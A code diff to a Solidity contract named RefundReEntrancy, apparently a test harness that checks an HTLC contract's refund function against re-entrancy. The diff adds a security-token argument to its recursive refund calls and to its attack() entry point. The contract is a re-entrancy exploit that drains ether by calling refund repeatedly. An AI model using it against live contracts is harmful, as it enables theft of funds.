@@ -8,6 +8,7 @@ contract RefundReEntrancy {
     HTLC_ETH htlcEth;
 
     bytes32 id;
+    address securityToken;
     
 
     constructor(address _htlcEthAddress) {
@@ -24,7 +25,7 @@ contract RefundReEntrancy {
 
         if(address(htlcEth).balance >= 0.2 ether) {
 
-            htlcEth.refund(id);
+            htlcEth.refund(id, securityToken);
 
         }
           
@@ -32,10 +33,11 @@ contract RefundReEntrancy {
 
     
 
-    function attack(bytes32 _swapID) external {
+    function attack(bytes32 _swapID, address _securityToken) external {
         id = _swapID;
+        securityToken = _securityToken;
     
-        htlcEth.refund(_swapID);
+        htlcEth.refund(_swapID, _securityToken);
 
     }
 
